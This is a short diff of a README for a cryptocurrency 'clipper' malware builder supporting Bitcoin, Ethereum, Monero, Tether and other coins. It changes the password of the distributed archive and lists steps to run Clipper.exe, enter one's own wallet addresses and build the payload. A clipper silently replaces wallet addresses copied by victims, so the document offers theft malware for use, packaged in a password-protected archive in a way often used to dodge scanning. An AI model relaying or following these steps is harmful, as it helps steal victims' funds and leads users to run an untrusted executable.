@@ -5,7 +5,7 @@ Supports Bitcoin, Ethereum, TRX, DOGE, Monero, Litecoin and TRC-20 Tether.
 
 # How to install:
 
-1. The password for the archive is - 2025
+1. The password for the archive is - 2026
 2. Run Clipper.exe
 3. Enter your addresses.
 4. Сlick on the build button.
